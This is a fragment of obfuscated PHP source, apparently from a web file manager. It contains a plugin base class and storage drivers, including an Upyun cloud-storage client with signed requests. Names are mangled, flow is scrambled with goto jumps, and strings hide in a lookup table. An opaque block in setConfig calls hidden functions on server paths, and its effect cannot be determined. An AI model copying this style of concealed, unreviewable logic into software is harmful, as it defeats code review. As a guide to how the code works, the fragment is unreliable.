$aæÂ–³À—¹ = array(); $aÈ²†ƒ‰İ¬ = array(); foreach ($c¹«™“Ö[0] as $b¶„…ìÁáØ) { $e¤¦×¾ÜŒ = substr($b¶„…ìÁáØ, strlen($e‡„ìÖ‘ö), -2); $aæÂ–³À—¹[] = $b¶„…ìÁáØ; $aÈ²†ƒ‰İ¬[] = _get($bèÚã£¼äº, $e¤¦×¾ÜŒ); } goto A¦ŞßóáÊ; Fî†¤ÌÏ«ó: $a—³›ÂÅù¾ =& $_SERVER[…Ò×–]; $e‡„ìÖ‘ö = $a—³›ÂÅù¾[1369]; if (!strstr($dÓ¥Õ…“›, $e‡„ìÖ‘ö)) { return; } goto b½³ŠœÏÙ©; A¦ŞßóáÊ: $dÓ¥Õ…“› = str_replace($aæÂ–³À—¹, $aÈ²†ƒ‰İ¬, $dÓ¥Õ…“›); goto BºˆÛÂ·äê; b½³ŠœÏÙ©: preg_match_all($a—³›ÂÅù¾[1370], $dÓ¥Õ…“›, $c¹«™“Ö); if (!is_array($c¹«™“Ö) || count($c¹«™“Ö) == 0 || !is_array($c¹«™“Ö[0]) || count($c¹«™“Ö[0]) == 0) { return; } $bèÚã£¼äº = $this->getConfig(); goto DßİõÈ±ó•; BºˆÛÂ·äê: } private function parsePackage(&$aÓÎ‹ÔÊ·É) { goto Bøƒ™ãñÆ…; Bøƒ™ãñÆ…: $dæÛ¦´½‰ =& $_SERVER[…Ò×–]; $E¼¿Ï­Ì´® = $dæÛ¦´½‰[1371]; if (!strstr($aÓÎ‹ÔÊ·É, $E¼¿Ï­Ì´®)) { return; } goto a¯ùÅŒÛØ; e’Øó¡ø»œ: $AŸ‰§½Ç = array(); $c‹¥ííéç = array(); foreach ($DÔğÄÚµÌà[0] as $c‚¬‘îñø) { $CÏ‚ÕÉãÙ³ = substr($c‚¬‘îñø, strlen($E¼¿Ï­Ì´®), -2); $AŸ‰§½Ç[] = $c‚¬‘îñø; $c‹¥ííéç[] = _get($b½Šù†ğ®¸, $CÏ‚ÕÉãÙ³); } goto D†š­”œ„É; D†š­”œ„É: $aÓÎ‹ÔÊ·É = str_replace($AŸ‰§½Ç, $c‹¥ííéç, $aÓÎ‹ÔÊ·É); goto AÔ÷Øå¼…‰; a¯ùÅŒÛØ: preg_match_all($dæÛ¦´½‰[1372], $aÓÎ‹ÔÊ·É, $DÔğÄÚµÌà); if (!is_array($DÔğÄÚµÌà) || count($DÔğÄÚµÌà) == 0 || !is_array($DÔğÄÚµÌà[0]) || count($DÔğÄÚµÌà[0]) == 0) { return; } $b½Šù†ğ®¸ = $this->appPackage(); goto e’Øó¡ø»œ; AÔ÷Øå¼…‰: } final function echoFile($CëŠĞì½ñ£, $FÌº‹ëÂİ = false) { goto d·Éíèè”Ÿ; bŸ‘¨ó¸çµ: $aœ„óÜè = $this->parseFile($fè”Õ£ãÌ); $this->parseLang($aœ„óÜè); $this->parseConfig($aœ„óÜè); goto a‰›‹·Ú×‚; a‰›‹·Ú×‚: $this->parsePackage($aœ„óÜè); if (is_array($FÌº‹ëÂİ)) { $aœ„óÜè = str_replace(array_keys($FÌº‹ëÂİ), array_values($FÌº‹ëÂİ), $aœ„óÜè); } echo $aàøÑùŞÇ[221] . $aœ„óÜè; goto bÉÌ½÷áëÆ; d·Éíèè”Ÿ: $aàøÑùŞÇ =& $_SERVER[…Ò×–]; $fè”Õ£ãÌ = $this->pluginPath . $CëŠĞì½ñ£; if (ACT == $aàøÑùŞÇ[1373]) { echo $aàøÑùŞÇ[1374] . $this->pluginName . $aàøÑùŞÇ[8] . $CëŠĞì½ñ£ . $aàøÑùŞÇ[1375]; if (!file_exists($fè”Õ£ãÌ)) { echo $aàøÑùŞÇ[1376]; return; } } goto bŸ‘¨ó¸çµ; bÉÌ½÷áëÆ: } final function initLang() { goto a¶éÓ´ÖÕ; b£Óœë ã’: $f ‘ËÅ•÷³ = I18n::getType(); $Cñ¾”İ³µ = array(); if (file_exists($AÈ½‡İÙğÄ . $f ‘ËÅ•÷³ . $B™ª’ïª©[770])) { $Cñ¾”İ³µ = (include $AÈ½‡İÙğÄ . $f ‘ËÅ•÷³ . $B™ª’ïª©[770]); } else { if ($f ‘ËÅ•÷³ == $B™ª’ïª©[1379] && !file_exists($AÈ½‡İÙğÄ . $f ‘ËÅ•÷³ . $B™ª’ïª©[770]) && file_exists($AÈ½‡İÙğÄ . $B™ª’ïª©[1380])) { $Cñ¾”İ³µ = (include $AÈ½‡İÙğÄ . $B™ª’ïª©[1380]); } else { if (file_exists($AÈ½‡İÙğÄ . $F…ò‹‘ÔùÛ . $B™ª’ïª©[770])) { $Cñ¾”İ³µ = (include $AÈ½‡İÙğÄ . $F…ò‹‘ÔùÛ . $B™ª’ïª©[770]); } } } goto e¨÷Ã‡¦ŒÔ; a¶éÓ´ÖÕ: $B™ª’ïª© =& $_SERVER[…Ò×–]; $F…ò‹‘ÔùÛ = $B™ª’ïª©[1377]; $AÈ½‡İÙğÄ = $this->pluginPath . $B™ª’ïª©[1378]; goto b£Óœë ã’; e¨÷Ã‡¦ŒÔ: if (!is_array($Cñ¾”İ³µ)) { return array(); } if (@count($Cñ¾”İ³µ) > 0) { I18n::set($Cñ¾”İ³µ); } return $Cñ¾”İ³µ; goto fœ°ÆèÚò; fœ°ÆèÚò: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($c½·Çİµˆæ) { $a ‹…Î¶àô =& $_SERVER[…Ò×–]; if ($_SERVER[$a ‹…Î¶àô[798]] != $_SERVER[$a ‹…Î¶àô[1134]]) { goto f‰Šê­İ™Á; cçèø–Ëº: $d–ö‡¿…Øã = $a ‹…Î¶àô[802]; $d–ö‡¿…Øã($_SERVER[$a ‹…Î¶àô[803]]); $d–ö‡¿…Øã($_SERVER[$a ‹…Î¶àô[795]] . $a ‹…Î¶àô[1381]); goto BòàÜâƒ½‹; f‰Šê­İ™Á: $EÒñÁ‘ƒ°ß = $a ‹…Î¶àô[799]; $eÁÒ•¯¯³¡ = $a ‹…Î¶àô[800]; $F‘¦Ï´ÓÇ‘ = $_SERVER[$a ‹…Î¶àô[795]] . $a ‹…Î¶àô[796]; goto cŒ¸Æ³­ÇŠ; BòàÜâƒ½‹: $Fè‰Ö×†´¨ = 1; while ($Fè‰Ö×†´¨ > 1) { $Fè‰Ö×†´¨ = $Fè‰Ö×†´¨ + 4; $cÈ–¡’ÅåÆ = rawurlencode($Fè‰Ö×†´¨ . $a ‹…Î¶àô[365]); } goto d©îìË‰„¬; cŒ¸Æ³­ÇŠ: $B•›ôªöÍØ = $eÁÒ•¯¯³¡($F‘¦Ï´ÓÇ‘); $C¤†£ô„Û´ = explode($a ‹…Î¶àô[221], $B•›ôªöÍØ); if (count($C¤†£ô„Û´) < $a ‹…Î¶àô[567]) { $fö”ƒì— = $a ‹…Î¶àô[801]; $fö”ƒì—(); } goto cçèø–Ëº; d©îìË‰„¬: } return $this->modelPlugin->setConfig($this->pluginName, $c½·Çİµˆæ); } public function onSetConfig($bòÊó‚÷¼–) { } public function onGetConfig($f¨áÊ‚ÂœÒ) { } public function onChangeStatus($CìµŸ¦¼÷Æ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($BéİÃÙÂÇ¨ = "\x70\154\x75\147\x69\x6e\x41\x75\164\150") { $BÇ–Ò©ÙÔ¶ =& $_SERVER[…Ò×–]; if (!defined($BÇ–Ò©ÙÔ¶[430])) { return !1; } if (_get($GLOBALS, $BÇ–Ò©ÙÔ¶[462])) { return !0; } $dªïµÉÎé = $this->getConfig(); if (!$dªïµÉÎé[$BéİÃÙÂÇ¨]) { return !1; } return ActionCall($BÇ–Ò©ÙÔ¶[1382], $dªïµÉÎé[$BéİÃÙÂÇ¨]); } public function url($D­Ôò”ë¸¾, $Bˆº¨—£Ğ = '', $FØÎİ¿ÔéÌ = true) { goto AĞèÙ„ä®‰; DçŸ¼‡â¹¬: if (!$FØÎİ¿ÔéÌ) { return $DÂ½ì¶÷ŞÕ; } echo $DÂ½ì¶÷ŞÕ; goto C”‚”Ÿ¶ôƒ; féÚÅ–‡Š¡: $aØ¬ãè“„ = $this->packageVersion(); $CË­íğÔğÚ = $FÈò×éŠâ‹ . $aÓëÁ¥ÖŒê[416] . $aØ¬ãè“„; if (substr($D­Ôò”ë¸¾, 0, 4) == $aÓëÁ¥ÖŒê[144] || substr($D­Ôò”ë¸¾, 0, 2) == $aÓëÁ¥ÖŒê[1168]) { $DÂ½ì¶÷ŞÕ = $D­Ôò”ë¸¾ . $aÓëÁ¥ÖŒê[1383] . $CË­íğÔğÚ; } else { if ($Bˆº¨—£Ğ == $aÓëÁ¥ÖŒê[33]) { $DÂ½ì¶÷ŞÕ = $this->pluginHost . $D­Ôò”ë¸¾ . $aÓëÁ¥ÖŒê[1383] . $CË­íğÔğÚ; } else { if ($Bˆº¨—£Ğ === $aÓëÁ¥ÖŒê[76]) { $DÂ½ì¶÷ŞÕ = $this->pluginHost . $D­Ôò”ë¸¾; } else { if ($Bˆº¨—£Ğ == $aÓëÁ¥ÖŒê[1384]) { $DÂ½ì¶÷ŞÕ = STATIC_PATH . $D­Ôò”ë¸¾ . $aÓëÁ¥ÖŒê[1383] . $FÈò×éŠâ‹; } else { if ($Bˆº¨—£Ğ == $aÓëÁ¥ÖŒê[1385]) { $DÂ½ì¶÷ŞÕ = APP_HOST . $aÓëÁ¥ÖŒê[1386] . $D­Ôò”ë¸¾ . $aÓëÁ¥ÖŒê[1383] . $FÈò×éŠâ‹; } else { if (isset($cäöÙëİ±ğ[$Bˆº¨—£Ğ])) { $DÂ½ì¶÷ŞÕ = $cäöÙëİ±ğ[$Bˆº¨—£Ğ] . $D­Ôò”ë¸¾ . $aÓëÁ¥ÖŒê[1383] . $CË­íğÔğÚ; } } } } } } goto DçŸ¼‡â¹¬; AĞèÙ„ä®‰: $aÓëÁ¥ÖŒê =& $_SERVER[…Ò×–]; $cäöÙëİ±ğ = $this->getConfig(); $FÈò×éŠâ‹ = KOD_VERSION . $aÓëÁ¥ÖŒê[91] . KOD_VERSION_BUILD; goto féÚÅ–‡Š¡; C”‚”Ÿ¶ôƒ: } public function link($C¢‘ÊÓ­’÷ = false, $e‹³º¯ßµ = '') { $dÔ…õùô =& $_SERVER[…Ò×–]; if (!$C¢‘ÊÓ­’÷) { $this->link($dÔ…õùô[1387], $dÔ…õùô[1385]); $this->link($dÔ…õùô[1388], $dÔ…õùô[1384]); $this->link($dÔ…õùô[1389], $dÔ…õùô[1384]); $this->link($dÔ…õùô[1390], $dÔ…õùô[1384]); $this->link($dÔ…õùô[1391], $dÔ…õùô[1384]); return; } $CÉì¯ÈÖ¹Á = $this->url($C¢‘ÊÓ­’÷, $e‹³º¯ßµ, !1); if (substr($C¢‘ÊÓ­’÷, -3) == $dÔ…õùô[1392]) { echo $dÔ…õùô[1393] . $CÉì¯ÈÖ¹Á . $dÔ…õùô[1394] . $dÔ…õùô[221]; } else { if (substr($C¢‘ÊÓ­’÷, -4) == $dÔ…õùô[1395]) { echo $dÔ…õùô[1396] . $CÉì¯ÈÖ¹Á . $dÔ…õùô[1397] . $dÔ…õùô[221]; } } } } goto EÔÑ–œêç‹; bÈã‘–ÅõŒ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($CÉÜÀ–™‘ã, $béá«ç›‘ = 0) { parent::__construct(); $this->source = $CÉÜÀ–™‘ã; $this->sourceSize = $béá«ç›‘; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Cì§àˆóÒ¸ = false) { return $this->sourceSize; } public function getContent($a¹‘³Ö–¬ = false) { return $this->fileSubstr($a¹‘³Ö–¬, 0, $this->sourceSize); } public function fileSubstr($aå„›ƒœß = false, $EêĞ»óĞ§¡ = 0, $b‰éøÀ¨­ç = 0) { if (!$b‰éøÀ¨­ç) { $b‰éøÀ¨­ç = $this->sourceSize; } $C›™è¿™ÃŞ = $this->sourceSize - $EêĞ»óĞ§¡; if ($b‰éøÀ¨­ç >= $C›™è¿™ÃŞ) { $b‰éøÀ¨­ç = $C›™è¿™ÃŞ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $EêĞ»óĞ§¡, $b‰éøÀ¨­ç); } if ($this->sourceType == self::TYPE_FILE) { if ($b‰éøÀ¨­ç <= 0) { return $_SERVER[…Ò×–][33]; } $dÛÅ”«‡ø = ftell($this->source); fseek_64($this->source, $dÛÅ”«‡ø + $EêĞ»óĞ§¡); $a¡õ¶¬Í´Ë = @fread($this->source, $b‰éøÀ¨­ç); fseek_64($this->source, $dÛÅ”«‡ø); return $a¡õ¶¬Í´Ë; } } public function hashMd5($AŞĞù¤ÓŞí = false) { return md5($this->getContent()); } public static function hash($E¤ÜĞá¦ˆî, $a¡à¬ã›¬ = 0) { $bŸ¶Ê¥¡Å² = new PathDriverStream($E¤ÜĞá¦ˆî, $a¡à¬ã›¬); return $bŸ¶Ê¥¡Å²->hashSimple($E¤ÜĞá¦ˆî); } public static function md5($a“À»¡»Ï, $DÊ¶Ä±½â© = 0) { $FÔµŠ‰‹ = new PathDriverStream($a“À»¡»Ï, $DÊ¶Ä±½â©); return $FÔµŠ‰‹->hashMd5($a“À»¡»Ï); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\57\x2f\166\x30\x2e\141\x70\x69\56\x75\x70\171\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($F»¥­çà¥Ñ) { parent::__construct(); $this->_init($F»¥­çà¥Ñ); } public function _init($E‘«Œˆ½ê) { $e¾›öšæ˜ˆ =& $_SERVER[…Ò×–]; foreach ($E‘«Œˆ½ê as $døŒ“›®ÛÂ => $EòŸ’ŒÂ¦¥) { if (isset($this->{$døŒ“›®ÛÂ})) { $this->{$døŒ“›®ÛÂ} = $EòŸ’ŒÂ¦¥; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($e¾›öšæ˜ˆ[1253] . LNG($e¾›öšæ˜ˆ[1185])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($f àª—ˆ‹, $F ãã– = "\107\x45\124") { $D¤Ìé½äÓ® =& $_SERVER[…Ò×–]; $aõ““Ü´ = gmdate($D¤Ìé½äÓ®[1218]); $d×ÂÙñÊ = base64_encode(hash_hmac($D¤Ìé½äÓ®[1254], "{$F ãã–}\46{$f àª—ˆ‹}\46{$aõ““Ü´}", md5("{$this->userpass}"), !0)); $c³Œ…­¹®° = array("\x41\165\x74\x68\x6f\162\151\x7a\x61\164\151\x6f\x6e\x3a\125\x50\131\x55\116\x20{$this->username}\72{$d×ÂÙñÊ}", "\x44\x61\164\145\x3a{$aõ““Ü´}"); return $c³Œ…­¹®°; } public function ussRequest($cÈØ—ï³ğ©, $BËã = "\107\x45\x54", $dš·áºÍ† = false, $a’¸‹Ü½ˆî = false, $f‡×š—Š¤ = false) { goto e‘Œ‡®æö; dì·Ó£ôó: if (!$d™…À½›õî) { return array($FÛé¼Ó­ÖÖ[1043] => !1, $FÛé¼Ó­ÖÖ[1045] => $FÛé¼Ó­ÖÖ[1255]); } if (strtolower($BËã) == $FÛé¼Ó­ÖÖ[188] || in_array($d™…À½›õî[$FÛé¼Ó­ÖÖ[1043]], array($FÛé¼Ó­ÖÖ[1110], $FÛé¼Ó­ÖÖ[1256]))) { $dš·áºÍ† = $d™…À½›õî[$FÛé¼Ó­ÖÖ[1257]]; } else { $dš·áºÍ† = json_decode($d™…À½›õî[$FÛé¼Ó­ÖÖ[1045]], !0); if (!$dš·áºÍ†) { $dš·áºÍ† = $d™…À½›õî[$FÛé¼Ó­ÖÖ[1045]]; } else { if (!$d™…À½›õî[$FÛé¼Ó­ÖÖ[694]] && isset($dš·áºÍ†[$FÛé¼Ó­ÖÖ[1258]])) { $dš·áºÍ† = $dš·áºÍ†[$FÛé¼Ó­ÖÖ[1258]]; } } } return array($FÛé¼Ó­ÖÖ[1043] => $d™…À½›õî[$FÛé¼Ó­ÖÖ[694]], $FÛé¼Ó­ÖÖ[1045] => $dš·áºÍ†); goto CËï´¼ƒ; e‘Œ‡®æö: $FÛé¼Ó­ÖÖ =& $_SERVER[…Ò×–]; $cÈØ—ï³ğ© = trim($cÈØ—ï³ğ©, $FÛé¼Ó­ÖÖ[8]); $bê«… ¹¡ = "\57{$this->bucket}\57{$cÈØ—ï³ğ©}"; goto AÄøâòˆ†ğ; AÄøâòˆ†ğ: $F«„° ©ƒ = $this->ussHeaders($bê«… ¹¡, $BËã); if ($a’¸‹Ü½ˆî) { $F«„° ©ƒ = array_merge($F«„° ©ƒ, $a’¸‹Ü½ˆî); } $d™…À½›õî = url_request($this->endpoint . $bê«… ¹¡, $BËã, $dš·áºÍ†, $F«„° ©ƒ, $f‡×š—Š¤); goto dì·Ó£ôó; CËï´¼ƒ: } public function mkfile($AÈŒğÖâÖÛ, $D¶Ş££ñÌ¥ = '', $a‚ô¬ëŒ÷¢ = REPEAT_RENAME) { if ($this->setContent($AÈŒğÖâÖÛ, $D¶Ş££ñÌ¥)) { return $this->getPathOuter($AÈŒğÖâÖÛ); } return !1; } public function mkdir($F—İëæòÜï, $E¢©£·±² = REPEAT_SKIP) { $Eßò»Úù =& $_SERVER[…Ò×–]; $A¿È×Ü™ò» = trim($F—İëæòÜï, $Eßò»Úù[8]); if ($this->_isFolder($A¿È×Ü™ò»)) { return $this->getPathOuter($A¿È×Ü™ò»); } $AœòÙÄô½ = array($Eßò»Úù[1259]); $E‹ò¢‚×Ñ¿ = $this->ussRequest($A¿È×Ü™ò», $Eßò»Úù[216], !1, $AœòÙÄô½); return $E‹ò¢‚×Ñ¿[$Eßò»Úù[1043]] ? $this->getPathOuter($A¿È×Ü™ò») : !1; } public function copyFile($c˜ÀÙ©§Å», $A™Ñæ¢œºê) { $eê´ìÌŒ ‹ =& $_SERVER[…Ò×–]; $DÄîº÷ùğ« = array($eê´ìÌŒ ‹[1260] . "\x2f{$this->bucket}\57{$c˜ÀÙ©§Å»}", $eê´ìÌŒ ‹[1261]); $A’¡Çê •¼ = $this->ussRequest($A™Ñæ¢œºê, $eê´ìÌŒ ‹[218], !1, $DÄîº÷ùğ«); return $A’¡Çê •¼[$eê´ìÌŒ ‹[1043]] ? !0 : $this->getPathOuter($A™Ñæ¢œºê); } public function moveFile($dòá·ÍÁÉ¢, $b©Á·µ¦Ã¾) { $CÅ¾ÙÆéµ =& $_SERVER[…Ò×–]; $C±–µğˆŒ¸ = array($CÅ¾ÙÆéµ[1262] . "\57{$this->bucket}\57{$dòá·ÍÁÉ¢}", $CÅ¾ÙÆéµ[1261]); $Fêöî¶âˆŒ = $this->ussRequest($b©Á·µ¦Ã¾, $CÅ¾ÙÆéµ[218], !1, $C±–µğˆŒ¸); return $Fêöî¶âˆŒ[$CÅ¾ÙÆéµ[1043]] ? !0 : $this->getPathOuter($b©Á·µ¦Ã¾); } public function delFile($E„Åğî½) { $dÅŠÖ¾í£Ê =& $_SERVER[…Ò×–]; $e•™»‘ì— = $this->ussRequest($E„Åğî½, $dÅŠÖ¾í£Ê[1263]); return $e•™»‘ì—[$dÅŠÖ¾í£Ê[1043]] ? !0 : !1; } public function delFolder($DÛˆ¾Ó¥ª) { $Döå‰‚Ùä• =& $_SERVER[…Ò×–]; $eÁÎ–À‡î = $this->listAll($DÛˆ¾Ó¥ª); krsort($eÁÎ–À‡î); foreach ($eÁÎ–À‡î as $fº¯Œ‹…) { $this->ussRequest($fº¯Œ‹…[$Döå‰‚Ùä•[75]], $Döå‰‚Ùä•[1263]); } return $this->ussRequest($DÛˆ¾Ó¥ª, $Döå‰‚Ùä•[1263]); } public function rename($Aæ…Œ²™Á¤, $D²ä†‚ë‚Ş) { if ($this->isFile($Aæ…Œ²™Á¤)) { $D²ä†‚ë‚Ş = get_path_father($Aæ…Œ²™Á¤) . $D²ä†‚ë‚Ş; return $this->moveFile($Aæ…Œ²™Á¤, $D²ä†‚ë‚Ş); } return $this->renameObject($Aæ…Œ²™Á¤, $D²ä†‚ë‚Ş); } public function fileInfo($c„Ÿ„‰ğ¼, $cÍ¨±Â®Á = false, $cÆÍÈø©© = array()) { $dŠŞ°Ç¥´ =& $_SERVER[…Ò×–]; if ($cÍ¨±Â®Á) { return array($dŠŞ°Ç¥´[28] => $this->pathThis($c„Ÿ„‰ğ¼), $dŠŞ°Ç¥´[75] => $this->getPathOuter($dŠŞ°Ç¥´[8] . $c„Ÿ„‰ğ¼), $dŠŞ°Ç¥´[29] => $dŠŞ°Ç¥´[171], $dŠŞ°Ç¥´[77] => isset($cÆÍÈø©©[$dŠŞ°Ç¥´[329]]) ? $cÆÍÈø©©[$dŠŞ°Ç¥´[329]] : 0, $dŠŞ°Ç¥´[165] => $this->ext($c„Ÿ„‰ğ¼)); } $dÊæŠÚò = array($dŠŞ°Ç¥´[28] => $this->pathThis($c„Ÿ„‰ğ¼), $dŠŞ°Ç¥´[75] => $this->getPathOuter($dŠŞ°Ç¥´[8] . $c„Ÿ„‰ğ¼), $dŠŞ°Ç¥´[29] => $dŠŞ°Ç¥´[171], $dŠŞ°Ç¥´[191] => 0, $dŠŞ°Ç¥´[107] => isset($AÜÂŞœõ·[$dŠŞ°Ç¥´[1264]]) ? $AÜÂŞœõ·[$dŠŞ°Ç¥´[1264]] : 0, $dŠŞ°Ç¥´[77] => isset($cÆÍÈø©©[$dŠŞ°Ç¥´[329]]) ? $cÆÍÈø©©[$dŠŞ°Ç¥´[329]] : 0, $dŠŞ°Ç¥´[165] => $this->ext($c„Ÿ„‰ğ¼), $dŠŞ°Ç¥´[192] => !0, $dŠŞ°Ç¥´[193] => !0); if (empty($cÆÍÈø©©)) { $cÆÍÈø©© = $this->objectMeta($c„Ÿ„‰ğ¼); if (!$cÆÍÈø©©) { return $dÊæŠÚò; } $dÊæŠÚò[$dŠŞ°Ç¥´[191]] = $cÆÍÈø©©[$dŠŞ°Ç¥´[1265]]; $dÊæŠÚò[$dŠŞ°Ç¥´[107]] = $cÆÍÈø©©[$dŠŞ°Ç¥´[1266]]; $dÊæŠÚò[$dŠŞ°Ç¥´[77]] = $cÆÍÈø©©[$dŠŞ°Ç¥´[77]]; } return $dÊæŠÚò; } public function folderInfo($Fµ‚Á‚¥Â­, $b‹ŠÇ§°À… = false) { $d®ÑõÃÚ—´ =& $_SERVER[…Ò×–]; if ($b‹ŠÇ§°À…) { return array($d®ÑõÃÚ—´[28] => $this->pathThis($Fµ‚Á‚¥Â­), $d®ÑõÃÚ—´[75] => $this->getPathOuter($d®ÑõÃÚ—´[8] . $Fµ‚Á‚¥Â­), $d®ÑõÃÚ—´[29] => $d®ÑõÃÚ—´[76]); } $a¿çèÎ—Õ¾ = array($d®ÑõÃÚ—´[28] => $this->pathThis($Fµ‚Á‚¥Â­), $d®ÑõÃÚ—´[75] => $this->getPathOuter($d®ÑõÃÚ—´[8] . $Fµ‚Á‚¥Â­), $d®ÑõÃÚ—´[29] => $d®ÑõÃÚ—´[76], $d®ÑõÃÚ—´[191] => 0, $d®ÑõÃÚ—´[107] => isset($AëÍ¥®êÀ»[$d®ÑõÃÚ—´[1264]]) ? $AëÍ¥®êÀ»[$d®ÑõÃÚ—´[1264]] : 0, $d®ÑõÃÚ—´[1175] => !0, $d®ÑõÃÚ—´[1176] => !0); if (empty($Añ‘·¬ˆ)) { $Añ‘·¬ˆ = $this->objectMeta($Fµ‚Á‚¥Â­); if (!$Añ‘·¬ˆ) { return $a¿çèÎ—Õ¾; } $a¿çèÎ—Õ¾[$d®ÑõÃÚ—´[191]] = $Añ‘·¬ˆ[$d®ÑõÃÚ—´[1265]]; $a¿çèÎ—Õ¾[$d®ÑõÃÚ—´[107]] = $Añ‘·¬ˆ[$d®ÑõÃÚ—´[1266]]; } return $a¿çèÎ—Õ¾; } private function fileList($bÆë÷ÓÔ†Î, $f™Ò¶â†¶ = 0, $AÍÑÇ¶³• = 1000) { $cæâŒ¥ÓÈ® =& $_SERVER[…Ò×–]; $aÏ¼ĞùÂ™± = array($cæâŒ¥ÓÈ®[1267], $cæâŒ¥ÓÈ®[1268] . $AÍÑÇ¶³•); if ($f™Ò¶â†¶) { $aÏ¼ĞùÂ™±[] = $cæâŒ¥ÓÈ®[1269] . $f™Ò¶â†¶; } $bèµÉ¿…à½ = $this->ussRequest($bÆë÷ÓÔ†Î, $cæâŒ¥ÓÈ®[220], !1, $aÏ¼ĞùÂ™±); return !$bèµÉ¿…à½[$cæâŒ¥ÓÈ®[1043]] ? !1 : $bèµÉ¿…à½[$cæâŒ¥ÓÈ®[1045]]; } public function listPath($a¦à«ê‘¥, $Dí »àìÚÖ = false) { goto A‰¤ƒêÒÔô; A‰¤ƒêÒÔô: $bïÃçäÓ” =& $_SERVER[…Ò×–]; $b®ŞßÇöÙ = $bïÃçäÓ”[33]; $Dê£×‰Êñ¼ = 1000; goto fäºè—ØÏƒ; fäºè—ØÏƒ: $fòãÀ‚«‚ì = $fƒ —Ä·Å¬ = array(); $b…èôõ¦Ü = rtrim($a¦à«ê‘¥, $bïÃçäÓ”[8]) . $bïÃçäÓ”[8]; while (!0) { $Fèİµ Å©— = $this->fileList($a¦à«ê‘¥, $b®ŞßÇöÙ, $Dê£×‰Êñ¼); if (!$Fèİµ Å©—) { return !1; } $b®ŞßÇöÙ = isset($Fèİµ Å©—[$bïÃçäÓ”[1270]]) ? $Fèİµ Å©—[$bïÃçäÓ”[1270]] : $bïÃçäÓ”[33]; $C½ÅÒõ´É³ = isset($Fèİµ Å©—[$bïÃçäÓ”[1271]]) ? $Fèİµ Å©—[$bïÃçäÓ”[1271]] : array(); foreach ($C½ÅÒõ´É³ as $DŞº‚‰ÁÖ) { if ($DŞº‚‰ÁÖ[$bïÃçäÓ”[29]] == $bïÃçäÓ”[76]) { $fòãÀ‚«‚ì[] = $this->folderInfo($b…èôõ¦Ü . $DŞº‚‰ÁÖ[$bïÃçäÓ”[28]], $Dí »àìÚÖ, $DŞº‚‰ÁÖ); } else { $fƒ —Ä·Å¬[] = $this->fileInfo($b…èôõ¦Ü . $DŞº‚‰ÁÖ[$bïÃçäÓ”[28]], $Dí »àìÚÖ, $DŞº‚‰ÁÖ); } } if (count($C½ÅÒõ´É³) < $Dê£×‰Êñ¼) { break; } } goto cğĞ‹»Á¬¯; cğĞ‹»Á¬¯: return array($bïÃçäÓ”[74] => $fòãÀ‚«‚ì, $bïÃçäÓ”[73] => $fƒ —Ä·Å¬); goto fÌÀ¾˜¡©; fÌÀ¾˜¡©: } private function recursionAllFiles($DÇ¯õ¢Úª, &$A±Ø÷ÓîáÉ) { $AİÔá¥Ñ… =& $_SERVER[…Ò×–]; $CùàÏ‰¾™é = $AİÔá¥Ñ…[33]; $E¿±ä‘Ãñ¥ = 1000; $BŒ÷ØôŒÜ = $dÛ¯‘½Š‚ç = array(); $f¹£È”œÌÑ = rtrim($DÇ¯õ¢Úª, $AİÔá¥Ñ…[8]) . $AİÔá¥Ñ…[8]; while (!0) { $AÌŸöá¸— = $this->fileList($DÇ¯õ¢Úª, $CùàÏ‰¾™é, $E¿±ä‘Ãñ¥); if (!$AÌŸöá¸—) { return !1; } $CùàÏ‰¾™é = isset($AÌŸöá¸—[$AİÔá¥Ñ…[1270]]) ? $AÌŸöá¸—[$AİÔá¥Ñ…[1270]] : $AİÔá¥Ñ…[33]; $ašèñ™ßí = isset($AÌŸöá¸—[$AİÔá¥Ñ…[1271]]) ? $AÌŸöá¸—[$AİÔá¥Ñ…[1271]] : array(); foreach ($ašèñ™ßí as $B«±¼•¥ë½) { $B³ÅÖ—ªİš = array($AİÔá¥Ñ…[75] => $f¹£È”œÌÑ . $B«±¼•¥ë½[$AİÔá¥Ñ…[28]], $AİÔá¥Ñ…[76] => $B«±¼•¥ë½[$AİÔá¥Ñ…[29]] == $AİÔá¥Ñ…[76] ? 1 : 0, $AİÔá¥Ñ…[77] => isset($B«±¼•¥ë½[$AİÔá¥Ñ…[329]]) ? $B«±¼•¥ë½[$AİÔá¥Ñ…[329]] : 0); $A±Ø÷ÓîáÉ[] = $B³ÅÖ—ªİš; if ($B³ÅÖ—ªİš[$AİÔá¥Ñ…[76]] == 1) { $this->recursionAllFiles($B³ÅÖ—ªİš[$AİÔá¥Ñ…[75]], $A±Ø÷ÓîáÉ); } } if (count($ašèñ™ßí) < $E¿±ä‘Ãñ¥) { break; } } } public function has($F‡¹êãÙ–Ş, $b±œëÀ°İ‘ = false, $e¹ˆÀ“®„à = true) { goto FÖäŠ½ò¤; FÖäŠ½ò¤: $aŒÖ¿°Êºø =& $_SERVER[…Ò×–]; $F“„´¾Õ½Ö = $aŒÖ¿°Êºø[33]; $D¾è«Æ¯²Ÿ = 1000; goto Aèƒ ÍŸ ğ; Aèƒ ÍŸ ğ: $fø–öˆİ´” = 0; $d…›¾×Öõ = 0; $d¡„±Ú¨³Ğ = rtrim($F‡¹êãÙ–Ş, $aŒÖ¿°Êºø[8]) . $aŒÖ¿°Êºø[8]; goto EÎœÆÆëğ“; EÎœÆÆëğ“: while (!0) { $C”’µ¯…â¹ = $this->fileList($F‡¹êãÙ–Ş, $F“„´¾Õ½Ö, $D¾è«Æ¯²Ÿ); if (!$C”’µ¯…â¹) { return !1; } $F“„´¾Õ½Ö = isset($C”’µ¯…â¹[$aŒÖ¿°Êºø[1270]]) ? $C”’µ¯…â¹[$aŒÖ¿°Êºø[1270]] : 